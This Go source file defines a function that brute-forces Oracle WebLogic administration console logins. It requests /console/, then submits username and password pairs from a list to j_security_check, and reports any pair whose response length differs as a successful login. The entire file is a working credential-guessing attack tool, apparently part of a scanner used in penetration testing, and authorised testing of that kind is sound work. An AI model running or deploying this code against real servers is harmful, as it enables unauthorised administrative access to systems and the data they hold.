package brute

import "fmt"

func Weblogic_brute(url string) (username string, password string) {
	if req, err := httpRequset(url+"/console/", "GET", ""); err == nil {
		if req.StatusCode == 302 {
			for uspa := range weblogicuserpass {
				if req2, err2 := httpRequset(url+"/console/j_security_check", "POST", fmt.Sprintf("j_username=%s&j_password=%s", weblogicuserpass[uspa].username, weblogicuserpass[uspa].password)); err2 == nil {
					if req2.ContentLength != req.ContentLength {
						fmt.Printf("weblogic-brute-sucess|%s:%s--%s", weblogicuserpass[uspa].username, weblogicuserpass[uspa].password, url)
						fmt.Println()
						return weblogicuserpass[uspa].username, weblogicuserpass[uspa].password
					}
				}
			}
		}
	}
	return "", ""
}
